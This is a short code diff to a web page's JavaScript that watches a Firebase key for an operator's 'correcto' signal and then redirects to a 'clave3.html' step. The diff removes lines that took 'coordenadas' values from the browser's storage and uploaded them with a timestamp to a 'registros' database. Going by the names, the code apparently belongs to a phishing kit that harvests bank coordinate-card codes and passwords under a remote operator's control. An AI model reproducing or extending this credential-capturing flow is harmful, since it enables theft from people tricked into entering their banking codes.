@@ -46,20 +46,9 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    db.ref("validacion_clave3").on("value", snap => {
+    db.ref("validacion_estado").on("value", snap => {
       const val = snap.val();
       if (val === "correcto") {
-        db.ref("registros").limitToLast(1).once("value", snap => {
-          const data = snap.val();
-          const key = Object.keys(data || {})[0];
-          if (key) {
-            const timestamp = new Date().toISOString();
-            db.ref("registros/" + key).update({
-              coordenadas: localStorage.getItem("coordenadas_input") || "",
-              coordenadasHora: timestamp
-            });
-          }
-        });
         db.ref("validacion_clave3").set("");
         window.location.href = "clave3.html";
         window.location.href = "clave3.html";
